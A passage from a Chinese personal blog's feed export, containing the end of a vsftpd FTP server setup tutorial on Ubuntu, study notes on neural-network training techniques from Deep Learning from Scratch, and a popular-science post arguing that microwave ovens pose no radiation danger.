http://cn.archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [883 kB]                                       </span><br><span class="line">Fetched 2,615 kB in 10s (271 kB/s)                                                                                             </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">49 packages can be upgraded. Run &#x27;apt list --upgradable&#x27; to see them.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第二步：安装vsftpd"><a href="#第二步：安装vsftpd" class="headerlink" title="第二步：安装vsftpd"></a>第二步：安装vsftpd</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo apt install vsftpd</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">The following additional packages will be installed:</span><br><span class="line">  ssl-cert</span><br><span class="line">Suggested packages:</span><br><span class="line">  openssl-blacklist</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  ssl-cert vsftpd</span><br><span class="line">0 upgraded, 2 newly installed, 0 to remove and 49 not upgraded.</span><br><span class="line">Need to get 132 kB of archives.</span><br><span class="line">After this operation, 402 kB of additional disk space will be used.</span><br><span class="line">Do you want to continue? [Y/n] y</span><br><span class="line">Get:1 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 ssl-cert all 1.0.39 [17.0 kB]</span><br><span class="line">Get:2 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 vsftpd amd64 3.0.3-12 [115 kB]</span><br><span class="line">Fetched 132 kB in 3s (50.0 kB/s) </span><br><span class="line">Preconfiguring packages ...</span><br><span class="line">Selecting previously unselected package ssl-cert.</span><br><span class="line">(Reading database ... 71512 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../ssl-cert_1.0.39_all.deb ...</span><br><span class="line">Unpacking ssl-cert (1.0.39) </span><br><span class="line">Selecting previously unselected package vsftpd..............................................................................] </span><br><span class="line">Preparing to unpack .../vsftpd_3.0.3-12_amd64.deb ...</span><br><span class="line">Unpacking vsftpd (3.0.3-12) ...######################.......................................................................] </span><br><span class="line">Setting up ssl-cert (1.0.39) ...#################################...........................................................] </span><br><span class="line">Progress: [ 56%] [##########################################################................................................] </span><br><span class="line">Setting up vsftpd (3.0.3-12) ...########################################################....................................] </span><br><span class="line">Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service → /lib/systemd/system/vsftpd.service.............] </span><br><span class="line">Processing triggers for man-db (2.9.1-1) </span><br><span class="line">Processing triggers for systemd (245.4-4ubuntu3.11) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第三步：添加用户"><a href="#第三步：添加用户" class="headerlink" title="第三步：添加用户"></a>第三步：添加用户</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo nano /etc/vsftpd.conf</span><br><span class="line">zh@ubuntu:~$ sudo useradd -m ftpuser</span><br><span class="line">zh@ubuntu:~$ sudo passwd ftpuser</span><br><span class="line">New password: </span><br><span class="line">Retype new password: </span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure><h2 id="第四步：测试"><a href="#第四步：测试" class="headerlink" title="第四步：测试"></a>第四步：测试</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/zh# echo &quot;TEST&quot; &gt; ../ftpuser/test.txt</span><br></pre></td></tr></table></figure><p><a href="https://www.helloimg.com/image/G9PfZv"><img src="https://www.helloimg.com/images/2021/12/16/G9PfZv.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/16/G9PfZv.png" srcset="data:image/png;base64,666" alt="G9PfZv.png"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 3</title>
      <link href="2021/12/11/deep_learning_from_scratch_3/"/>
      <url>2021/12/11/deep_learning_from_scratch_3/</url>
      
        <content type="html"><![CDATA[<h2 id="误差反向传播法"><a href="#误差反向传播法" class="headerlink" title="误差反向传播法"></a>误差反向传播法</h2><a id="more"></a><h3 id="Affine-层（仿射变换）"><a href="#Affine-层（仿射变换）" class="headerlink" title="Affine 层（仿射变换）"></a>Affine 层（仿射变换）</h3><blockquote><p>神经网络的正向传播中进行的矩阵的乘积运算在几何学领域被称为“仿射变换”</p></blockquote><p>​    注：在affine层的反向传播过程中要注意矩阵形状</p><h3 id="梯度确认-gradient-check"><a href="#梯度确认-gradient-check" class="headerlink" title="梯度确认(gradient check)"></a>梯度确认(gradient check)</h3><blockquote><p>确认数值微分求出的梯度结果和误差反向传播法求出的结果是否一致的操作</p></blockquote><p>​    用于确认误差反向传播法的实现是否正确</p><h2 id="与学习相关的技巧"><a href="#与学习相关的技巧" class="headerlink" title="与学习相关的技巧"></a>与学习相关的技巧</h2><h3 id="最优化"><a href="#最优化" class="headerlink" title="最优化"></a>最优化</h3><blockquote><p>解决“寻找最优参数的问题”的过程</p></blockquote><h3 id="SGD"><a href="#SGD" class="headerlink" title="SGD"></a>SGD</h3><blockquote><p>$$<br>W= W-η\frac{\partial L}{\partial W}<br>$$</p></blockquote><p><strong>缺点</strong></p><blockquote><p>如果函数的形状非均向(anisotropic)，搜索的路径就会非常低效</p><p>抵消的根本原因：梯度的方向并没有指向最小值的方向</p></blockquote><h3 id="Momentum"><a href="#Momentum" class="headerlink" title="Momentum"></a>Momentum</h3><blockquote><p>$$<br>v=\alpha v - \eta \frac{\partial L}{\partial W}<br>$$</p><p>$$<br>W=W+v<br>$$</p></blockquote><h3 id="AdaGrad"><a href="#AdaGrad" class="headerlink" title="AdaGrad"></a>AdaGrad</h3><blockquote><p>$$<br>h=h+\frac{\partial L}{\partial W} .\frac{\partial L}{\partial W}<br>$$</p><p>$$<br>W=W-\eta \frac{1}{h^{\frac{1}{2}}}\frac{\partial L}{\partial W}<br>$$</p></blockquote><p>​    AdaGrad会记录过去所有梯度的平方和。因此，学习越深入，更新的幅度就越小。实际上，如果无止境的学习，更新量就会变成零</p><h3 id="Adam"><a href="#Adam" class="headerlink" title="Adam"></a>Adam</h3><blockquote><p>融合了Momentum和AdaGrad方法。通过组合前面两个方法的优点，有望实现参数空间的高效搜索</p><p>特征：超参数的“偏置校正”</p></blockquote><h3 id="权重的初始值"><a href="#权重的初始值" class="headerlink" title="权重的初始值"></a>权重的初始值</h3><p>​    将权重设置为0的问题</p><p>​    如果将权重设置为零，那么下一层的神经元会杯传递相同的值，从而达不到学习的效果（乘法反向传播的例子），则在反向传播时第二层的权重进行同样的更新，这使得神经网络拥有许多不同的权重的意义丧失了。即防止“权重均一化”（瓦解权重的对称结构）</p><h3 id="梯度消失（梯度爆炸）"><a href="#梯度消失（梯度爆炸）" class="headerlink" title="梯度消失（梯度爆炸）"></a>梯度消失（梯度爆炸）</h3><p>在运用链式法则时，由于运算时以连乘的形式进行，所以当层数很深时，随着层数的增加，计算出的梯度会指数级变化，如果是往小了变，就出现了<strong>梯度消失</strong>现象，如果是往大了变，就出现了<strong>梯度爆炸</strong>现象</p><h3 id="表现力受限"><a href="#表现力受限" class="headerlink" title="表现力受限"></a>表现力受限</h3><p>当传递给神经元的是有所偏向的数据时，有可能会出现<strong>表现力受限</strong>的问题，即多个神经元输出相同的结果，那同样可以由一个神经元完成的事情无疑令这些神经元的存在变得无意义</p><h3 id="Xavier初始值"><a href="#Xavier初始值" class="headerlink" title="Xavier初始值"></a>Xavier初始值</h3><blockquote><p>如果前一层的节点数为n，则初始值使用标准差为1/(n^(1/2))的分布</p></blockquote><h3 id="ReLU的权重初始值"><a href="#ReLU的权重初始值" class="headerlink" title="ReLU的权重初始值"></a>ReLU的权重初始值</h3><blockquote><p>当激活函数使用ReLU时，一般推荐使用ReLU专用的初始值，也称为“He初始值”</p><p>He初始值使用标准差为(2/n)^(1/2)的高斯分布</p></blockquote><h3 id="Batch-Nomalization-Batch-Norm"><a href="#Batch-Nomalization-Batch-Norm" class="headerlink" title="Batch Nomalization (Batch Norm)"></a>Batch Nomalization (Batch Norm)</h3><blockquote><p>以进行学习时的mini-batch为单位，按mini-batch进行正规化</p><p>进行使数据分布的均值为0，方差为1的正规化<br>$$<br>\mu <em>B=\frac{1}{m}\Sigma^m</em>{i=1}x_i<br>$$</p><p>$$<br>\sigma ^2_B=\frac{1}{m}\Sigma^m_{i=1}(x_i-\mu_B)^2<br>$$</p><p>$$<br>x_i=\frac{x_i-\mu_B}{\sqrt{\sigma_B^2+\epsilon}}<br>$$</p></blockquote><p>优点：</p><ul><li>可以使学习快速进行（可以增大学习率）</li><li>不那么依赖初始值（对于初始值不用那么神经质）</li><li>抑制过拟合（降低Dropou等的必要性）</li></ul><h3 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h3><blockquote><p>只能拟合训练数据，但不能很好地拟合不包含在训练数据中的其他数据的状态</p></blockquote><p>原因</p><ul><li> 模型拥有大量参数，表现力强</li><li>训练数据少</li></ul><h3 id="权值衰减"><a href="#权值衰减" class="headerlink" title="权值衰减"></a>权值衰减</h3><blockquote><p>通过在学习的过程中对大的权重进行惩罚，来抑制过拟合</p></blockquote><p>例：为损失函数加上权重的平方范数（1/2λW^2）</p><h3 id="Dropout"><a href="#Dropout" class="headerlink" title="Dropout"></a>Dropout</h3><blockquote><p>Dropout是一种在学习的过程中随机删除神经元的方法。训练时，随机选出隐藏层的神经元，然后将其删除。被删除的神经元不再进行信号的传递</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微波炉究竟有没有辐射</title>
      <link href="2021/11/30/microwave_oven/"/>
      <url>2021/11/30/microwave_oven/</url>
      
        <content type="html"><![CDATA[<blockquote><p>震惊！这个常见的家用电器竟有这么大的辐射</p></blockquote><a id="more"></a><h2 id="直奔主题，微波炉对人体究竟会不会产生危害"><a href="#直奔主题，微波炉对人体究竟会不会产生危害" class="headerlink" title="直奔主题，微波炉对人体究竟会不会产生危害"></a>直奔主题，微波炉对人体究竟会不会产生危害</h2><p>要知道微波炉是否会对人体产生危害，就得先知道什么程度的微波会对人体产生危害</p><blockquote><img src="https://www.helloimg.com/images/2021/11/30/Ga0JEt.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga0JEt.png" srcset="data:image/png;base64,666" alt="Ga0JEt.png" style="zoom:50%;" /><img src="https://www.helloimg.com/images/2021/11/30/Ga0xjQ.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga0xjQ.png" srcset="data:image/png;base64,666" alt="Ga0xjQ.png" style="zoom:50%;" /></blockquote><p>可以看出，只要50mm以外泄露的微波小于等于50W/m^2，就不会对人体造成影响，而市面上的绝大多数微波炉也都满足这一标准，即使在使用了一段时间后，虽然门把手及炉门密封处微波泄漏量略有上升，但也都在标准以内</p><p>顺便说一声，微波炉的产生的辐射属于非电离辐射，并不能破坏分子结构和产生电离作用；频率在2.45GHz左右，也就WIFI的频率，而且微波炉是在金属容器中工作的，这些金属容器能够很好地限制微波</p><p><strong>所以，微波炉不会对人体造成伤害</strong></p><h2 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a>问题解答</h2><h4 id="微波炉泄漏的辐射会致畸？"><a href="#微波炉泄漏的辐射会致畸？" class="headerlink" title="微波炉泄漏的辐射会致畸？"></a>微波炉泄漏的辐射会致畸？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>同样是2.45GHz左右的频率，既然WIFI没有致畸作用，想必微波炉也不具备这样的能力</p><p><img src="data:image/jpeg;base64,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